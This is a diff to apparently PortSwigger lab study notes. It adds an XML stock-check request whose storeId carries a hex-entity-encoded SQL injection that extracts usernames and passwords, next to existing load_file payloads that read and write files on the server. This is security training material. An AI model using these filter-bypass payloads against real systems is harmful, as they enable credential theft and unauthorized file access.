@@ -2981,6 +2981,16 @@ The following XML payload in POST body can be used to identify existing DTD file
 <@hex_entities>1 UNION all select load_file('/home/carlos/secret')<@/hex_entities>  
 
 <@hex_entities>1 UNION all select load_file('/home/carlos/secret') into outfile '/tmp/secret'<@/hex_entities>
+
+<?xml version="1.0" encoding="UTF-8"?>
+<stockCheck>
+  <productId>
+ 1
+  </productId>
+  <storeId>
+1 &#x55;&#x4E;&#x49;&#x4F;&#x4E;&#x20;&#x53;&#x45;&#x4C;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x20;&#x7C;&#x7C;&#x20;&#x27;&#x7E;&#x27;&#x20;&#x7C;&#x7C;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4F;&#x4D;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
+  </storeId>
+</stockCheck>
 ```  
 
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
